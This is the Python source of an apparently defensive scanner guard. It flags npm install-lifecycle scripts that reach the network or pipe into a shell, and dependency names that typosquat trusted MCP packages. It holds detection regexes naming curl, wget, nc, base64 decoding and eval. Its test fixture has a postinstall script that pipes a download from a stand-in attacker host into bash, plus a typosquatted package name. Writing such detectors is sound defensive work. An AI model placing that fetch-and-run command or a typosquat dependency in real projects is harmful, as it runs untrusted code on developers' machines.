"""Guard: an npm `package.json` install-lifecycle script invokes a network command, or a
dependency's package name closely resembles a well-known MCP package without matching it exactly
— checklist §8, new item; agent-audit-kit's `supply_chain.py` AAK-SUPPLY-001/002 (verified against
real repo source; AAK-SUPPLY-003, a set of specific hardcoded axios/openclaw version pins, is
deliberately not ported here — those belong in `version_floors.json` after independent
verification against real PyPI/npm/NVD data, tracked separately, not fabricated as a source-check
in this guard).

npm runs `preinstall`/`install`/`postinstall`/`prepare` scripts automatically, with no
confirmation, the instant a package is installed — the exact mechanism the 2026-03-31 Claude Code
supply-chain compromise (a poisoned `axios` dependency) and the disclosed 104-CVE OpenClaw chain
(Adversa AI) both used to reach arbitrary code execution on a developer's machine. A script that
fetches content over the network during install, before any of the package's own code has been
reviewed or even installed, is the highest-leverage point in the whole dependency chain to
compromise. A custom `install` script is the same class as `preinstall`/`postinstall`: npm runs it
in place of its own default build step, so declaring one is exactly as automatic and exactly as
unreviewed as the other two.

Two checks:

  1. **`install-script-network-call`** (HIGH): `package.json`'s `scripts.preinstall`/
     `scripts.install`/`scripts.postinstall`/`scripts.prepare` value invokes a network-capable
     command (`curl`/`wget`/`fetch`/`nc`/`ncat`/`ssh`/a bare `http`/`https` URL/`axios`/`request`).
     Each word only counts at a COMMAND position, not as a script filename: `fetch` needs a
     preceding command separator (`;`/`&`/`|`/`(`/line-start) and none of the words count when
     followed by a `-`, `:`, `.` or another word character, so `npm run fetch-assets`, a
     `fetch:data` script name, and `node scripts/curl.js` are not flagged.
  1b. **`install-script-shell-obfuscation`** (HIGH): the same four lifecycle values pipe into a
     shell (`| sh`/`bash`/`zsh`/`pwsh`), decode base64 (`base64 -d`, `openssl base64 -d`), or run
     `eval`/`source` at a command position. `node-gyp rebuild`, `husky install` and
     `prebuild-install` stay silent.
  2. **`mcp-package-typosquat`** (HIGH): a `dependencies`/`devDependencies` entry's package name
     is a near-miss (length within 2, a substring relationship, or all-but-one shared characters)
     of a well-known, trusted MCP package name, without matching it exactly — the same typosquat
     heuristic `skill-poisoning`'s `trusted-name-typosquat` rule already uses for skill names,
     applied here to npm package names instead. A trailing plural `s` or version digit
     (`mcp-servers`, `fastmcp2`) is exempted: that shape is its own, distinct package name, not a
     typosquat of the trusted one.

Suppress an audited case with:

    // security: allow-npm-install-script-network

(a literal string anywhere in `package.json`; JSON has no comment syntax).
"""
from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import CanaryPlant, Guard, is_nonproduct_path, iter_files_named, pragma_present, read, rel

# `package.json` has no comment syntax, so its pragma is matched on the raw text by contract
# (`dialect=None`, #1040 T5).
_PRAGMA = "security: allow-npm-install-script-network"

_INSTALL_LIFECYCLE_KEYS = ("preinstall", "install", "postinstall", "prepare")
# A network COMMAND, not a word that happens to contain one: `fetch` only counts at a command
# position (start of the script or right after `;`/`&`/`|`/`(`), and none of the command words
# count when a `-`, `:` or word character follows, so `npm run fetch-assets` and
# `npm run fetch:data` (script names) are not a network call.
_NETWORK_IN_SCRIPTS = re.compile(
    # A file EXTENSION after the word is excluded too: `node scripts/curl.js` is a script
    # FILENAME, the same class `fetch-assets`/`fetch:data` already excludes for `fetch`. A plain
    # `.` is NOT excluded on its own -- `axios.get(url)` (a method call chain) must still fire,
    # so only the specific ".<script-extension>" shape is a lookahead, not "." in general.
    r"\b(?:curl|wget|nc|ncat|ssh|axios|request)(?![\w:-])(?!\.(?:m?js|c?js|ts|py|sh)\b)"
    r"|(?:^|[;&|(])\s*fetch(?![\w:-])(?!\.(?:m?js|c?js|ts|py|sh)\b)"
    r"|https?://",
    re.IGNORECASE,
)

# Shell-level obfuscation in a lifecycle value (mined from wormguard's shell classifier): a pipe
# into a shell, base64 decoding, or eval/source at a COMMAND position. Network words are not
# required: `echo <b64> | base64 -d | sh` reaches no network yet runs an opaque payload.
_SHELL_PIPE = re.compile(r"\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|ksh|powershell|pwsh)(?![\w.:-])", re.IGNORECASE)
_SHELL_B64 = re.compile(
    r"\bbase64\s+(?:-d|-D|--decode)(?![\w-])|\bopenssl\s+(?:base64|enc)\b[^|;&]*\s-d(?![\w-])",
    re.IGNORECASE,
)
_SHELL_EVAL = re.compile(r"(?:^|[;&|(`]|\$\()\s*(?:eval|source)\s")

_TRUSTED_MCP_PACKAGE_NAMES = frozenset({
    "@modelcontextprotocol/sdk",
    "@modelcontextprotocol/server-filesystem",
    "@modelcontextprotocol/server-github",
    "@modelcontextprotocol/server-slack",
    "@modelcontextprotocol/server-postgres",
    "@modelcontextprotocol/server-puppeteer",
    "@modelcontextprotocol/inspector",
    "@modelcontextprotocol/create-server",
    "fastmcp",
    "mcp-server",
    "mcp-framework",
})

_STD_NETWORK = ["CWE-829", "OWASP-ASI:ASI04"]
_STD_TYPOSQUAT = ["CWE-1021", "OWASP-ASI:ASI04"]


def _looks_like(candidate: str, target: str) -> bool:
    if candidate == target:
        return False
    if candidate.startswith(target) and re.fullmatch(r"s|\d+", candidate[len(target):]):
        return False  # a plural or version-suffixed name (`mcp-servers`, `fastmcp2`) is its own package
    if abs(len(candidate) - len(target)) > 2:
        return False
    if target in candidate or candidate in target:
        return True
    shared = sum(1 for a, b in zip(candidate, target, strict=False) if a == b)
    return shared >= min(len(candidate), len(target)) - 1


def _load(raw: str) -> dict[str, Any] | None:
    try:
        data = json.loads(raw)
    except (ValueError, RecursionError):  # hostile deep nesting: skip the file, keep the guard
        return None
    return data if isinstance(data, dict) else None


class NpmInstallScriptNetworkGuard(Guard):
    id = "npm-install-script-network"
    title = "npm install-lifecycle script reaches the network, or a dependency name typosquats a trusted MCP package"
    area = "AI agent"

    # npm-install-script-network-canary/package.json: postinstall runs curl | bash, and a
    # dependency typosquats @modelcontextprotocol/sdk -> fires
    # npm-install-script-network/install-script-network-call and
    # npm-install-script-network/mcp-package-typosquat. A nested directory (not the repo-root
    # package.json, which canary.py's shared scaffolding already owns for other guards) so this
    # guard gets its own unshared plant file.
    canary_plant = CanaryPlant(
        files={
            "npm-install-script-network-canary/package.json": (
                '{\n'
                '  "name": "example-app",\n'
                '  "scripts": {\n'
                '    "postinstall": "curl -fsSL https://attacker.example.com/setup.sh | bash"\n'
                '  },\n'
                '  "dependencies": {\n'
                '    "@modelcontextprotocol/sdkk": "^1.0.0"\n'
                '  }\n'
                '}\n'
            ),
        },
        expects=frozenset({
            "npm-install-script-network/install-script-network-call",
            "npm-install-script-network/mcp-package-typosquat",
            "npm-install-script-network/install-script-shell-obfuscation",
        }),
    )

    def applies(self, profile: StackProfile) -> bool:  # noqa: ARG002
        return True

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        for f in iter_files_named(root, "package.json"):
            r = rel(root, f)
            if is_nonproduct_path(r, profile.archive_segments):
                continue
            raw = read(f)
            if not raw or pragma_present(_PRAGMA, raw, dialect=None):
                continue
            data = _load(raw)
            if data is None:
                continue
            out.extend(self._check_install_scripts(r, data))
            out.extend(self._check_typosquat(r, data))
        return out

    def _check_install_scripts(self, r: str, data: dict[str, Any]) -> list[Finding]:
        scripts = data.get("scripts")
        if not isinstance(scripts, dict):
            return []
        out: list[Finding] = []
        for key in _INSTALL_LIFECYCLE_KEYS:
            value = scripts.get(key)
            if isinstance(value, str) and _NETWORK_IN_SCRIPTS.search(value):
                out.append(self._finding(
                    r, "install-script-network-call", _STD_NETWORK,
                    f"The `{key}` script runs automatically on install, with no "
                    f"confirmation, and reaches the network: {value!r}. This is the exact "
                    "mechanism the 2026-03-31 Claude Code supply-chain compromise (a "
                    "poisoned axios dependency) and the disclosed 104-CVE OpenClaw chain "
                    "both used to reach code execution before a developer ever reviews the "
                    "package's own code.",
                    "Remove the network call from the install lifecycle script entirely. "
                    "If a post-install setup step is genuinely required, have it run "
                    "explicitly (a documented `npm run setup` command), never automatically "
                    "on install.",
                ))
        for key in _INSTALL_LIFECYCLE_KEYS:
            value = scripts.get(key)
            if not isinstance(value, str):
                continue
            kinds = [
                label for label, rx in (
                    ("pipes into a shell", _SHELL_PIPE),
                    ("decodes base64", _SHELL_B64),
                    ("runs eval/source", _SHELL_EVAL),
                ) if rx.search(value)
            ]
            if kinds:
                out.append(self._finding(
                    r, "install-script-shell-obfuscation", _STD_NETWORK,
                    f"The `{key}` script runs automatically on install and {' and '.join(kinds)}: "
                    f"{value!r}. Piping into a shell, decoding an opaque blob, or eval-ing a "
                    "string hides what actually executes from anyone reviewing the package, "
                    "the signature of an install-time malware dropper.",
                    "Replace the inline shell trickery with a plain, reviewable command or a "
                    "checked-in script. If a payload is genuinely needed, ship it as a file in "
                    "the package rather than an encoded string.",
                ))
        return out

    def _check_typosquat(self, r: str, data: dict[str, Any]) -> list[Finding]:
        out: list[Finding] = []
        seen: set[str] = set()
        for dep_key in ("dependencies", "devDependencies", "optionalDependencies"):
            deps = data.get(dep_key)
            if not isinstance(deps, dict):
                continue
            for name in deps:
                if not isinstance(name, str) or name in _TRUSTED_MCP_PACKAGE_NAMES or name in seen:
                    continue
                for trusted in _TRUSTED_MCP_PACKAGE_NAMES:
                    if _looks_like(name.lower(), trusted.lower()):
                        seen.add(name)
                        out.append(self._finding(
                            r, "mcp-package-typosquat", _STD_TYPOSQUAT,
                            f"Dependency {name!r} is a near-miss of the trusted MCP package "
                            f"name {trusted!r} without matching it exactly — a classic "
                            "typosquat shape, where a developer or an automated dependency "
                            "add believes they are installing the real package.",
                            f"Verify this is genuinely the package you intend to depend on. "
                            f"If it is a typo, replace it with the real {trusted!r} package.",
                        ))
                        break
        return out

    def _finding(self, r: str, rule_suffix: str, standards: list[str], message: str, remediation: str) -> Finding:
        return Finding(
            check_id=self.id,
            severity="high",
            title=self.title,
            location=r,
            message=message,
            remediation=remediation,
            rule=f"npm-install-script-network/{rule_suffix}",
            standards=list(standards),
        )
